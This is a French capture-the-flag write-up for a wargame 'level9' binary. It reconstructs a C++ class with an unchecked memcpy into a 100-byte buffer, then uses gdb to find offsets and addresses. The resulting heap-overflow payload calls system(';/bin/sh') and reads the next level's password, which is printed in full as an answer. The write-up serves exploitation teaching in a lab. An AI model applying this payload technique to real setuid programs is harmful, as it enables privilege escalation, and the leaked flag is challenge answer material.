Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2009(level9) gid=2009(level9) groups=2009(level9),100(users)
/home/user/level9
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level9 :

```bash
$ ./level9
$
$ ./level9 da
$
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=563ef243-714b-4c51-a5a5-ecc13358fab5) et en extrait une version probable du code :


```c++
class N
{
    public:
        N(int x) : number(x)
        {
        }

        void setAnnotation(char *input) // <----2 writes into the 100 bytes buffer with a user defined limit = heap overflow
        {
            memcpy(annotation, input, strlen(input)); 
        }

        virtual int operator+(N &some)
        {
            return number + some.number;
        }

        virtual int operator-(N &some)
        {
            return number - some.number
        }

    private:
        char annotation[100]; // <--------------1 100 bytes buffer declared here
        int number;
};

int main(int argc, char **argv)
{
	if (argc <= 1)
        exit(1);

	N *five = new N(5); // <--------------------3 first reference
	N *six = new N(6);

	N &fiveref = *five // <---------------------4 second reference
    N &sixref = *six;

	fiveref.setAnnotation(argv[1]);

	return fiveref + sixref; // <---------------5 N is evaluated and will double jump to Ret2Libc due to the overflow
}
```
Oh... Il semble qu'on ai à faire à du `C++` ici.
Cette reconstitution s'appuie principalement sur la décompilation par `Hexray` en unifiant l'ensemble dans une `classe` nommée `N`.

A priori, pas d'appel à `bin/sh` dans le code, il va donc me falloir utiliser l'une des méthodes des premiers niveaux, notamment celle d'exécution arbitraire de fonction dans la `libc` (`Ret2Libc`), si `C++` me le permet.

La seule vulnérabilité que j'observe dans cette reconstitution serait `memcpy()`. Ici, `memcpy()` ne s'assure pas que l'annotation passée par `argv[1]` rentre dans le buffer de `100` déclaré par la structure N lorsqu'elle utilise `setAnnotation()`.

Il serait donc possible ici alors de ré-écrire la valeur de retour de la fonction `setAnnotation()` afin qu'elle pointe, à la manière du `level2`, sur un appel arbitraire à `system()`, auquel nous pourrons demander d'exécuter `bin/sh`. Cependant, il faut noter la double référence présente dans le code source, il faudra faire donc deux "saut" : il ne sera pas possible d'appeller `system()` directement à l'overflow à cause de la dé-référence. 

On peut observer cette spécificité avec `gdb` :

```h
...
   0x08048693 <+159>:   call   *%edx
...
```

Une façon d'y pallier serait que l'overflow fasse pointer sur le début d'`annotation`, lui même contenant l'appel à `system()`.

Je cherche d'abord l'adresse de `system()` avec `gdb` :

```h
$ gdb ./level9
(gdb) disas main
    ...
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret

(gdb) break *main+165
Breakpoint 1 at 0x8048699

(gdb) set args dab

(gdb) r
Starting program: /home/user/level9/level9 dab

Breakpoint 1, 0x08048699 in main ()

(gdb) print system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```

Je détermine ensuite le padding nécessaire pour l'overflow :

```bash
$ ./level9 `python -c 'print("\x90" * 100)'`
$ ./level9 `python -c 'print("\x90" * 200)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 150)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 125)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 110)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 105)'`
$ ./level9 `python -c 'print("\x90" * 108)'`
$ ./level9 `python -c 'print("\x90" * 109)'`
Segmentation fault (core dumped)
```

En rétrospecte, je comprend pourquoi je trouve que l'overflow est à 108 bytes : plus haut, j'ai déterminé que le buffer `annotation` était de 100 bytes, et qu'`Hexray` le placait à `ebp-8`, mais aussi, et plus spécifiquement, qu'il était déclaré ici : `v3 = (N *)operator new(0x6Cu);` à 108 bytes.
Cela corrèle donc avec le segfault observé au 109ème `NOP` passé dans les test ci-dessus.

Il me faut donc trouver quelle est l'adresse qui correspond au début de mon payload infecté lorsqu'il est utilisé par `setAnnotation()`, si la première adresse de l'overflow pointe vers le début du payload, alors le programme exécutera ensuite le payload, et donc `system()` auquel je pourrais passer `bin/sh` comme argument.

Je me penche sur `gdb` pour trouver l'adresse du début de l'array `annotation`.

Je peux trouver l'adresse de `annotation` en inférant que `%eax` la contiendra au retour de `setAnnotation()` car `memcpy()`[retourne son premier argument](https://pubs.opengroup.org/onlinepubs/7908799/xsh/memcpy.html), et il sera donc stocké dans `%eax`.

Je peux lancer le binaire, mettre un break au retour de `setAnnotation()`, puis analyser la valeur de `%eax` :

```h
(gdb) b *main+136
Breakpoint 1 at 0x804867c

(gdb) set args dab

(gdb) r
Starting program: /home/user/level9/level9 dab

Breakpoint 1, 0x0804867c in main ()
(gdb) info registers
eax            0x804a00c        134520844
ecx            0x6164   24932
edx            0x804a00f        134520847
ebx            0x804a078        134520952
...
```

Je trouve donc l'adresse : `0x804a00c`.

Avec ces 3 informations :

- Adresse de `system()` -> 0xb7d86060
- Overflow à 108 bytes
- Adresse de `annotation` -> 0x804a00c

J'essaye ce paytl
Je peux créer un payload infecté :

```python
#                |    system()    |         | NOP sled |    | annotation[0] |         | system(args) |    
python -c 'print("\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh")'
```

Ce payload aura pour effet d'overflow après le padding de 104 bytes (108 - l'adresse de `system()`), trouvera une adresse qui pointe sur le début d'`annotation`, ce qui exécutera le début de `annotation`, et donc `system()`, qui prendra comme argument le `NOP sled` (le padding), l'adresse qui pointait vers `annotation`, puis pour ignorer le 'bruit' précédent, passera `;bin/sh` avec un ';' afin que l'instruction précédente soit simplement un échec et que le shell soit ensuite exécuté.

Je teste mon payload :

```bash

$ ./level9 $(python -c 'print("\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh")')
sh: 1:
       : not found
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```







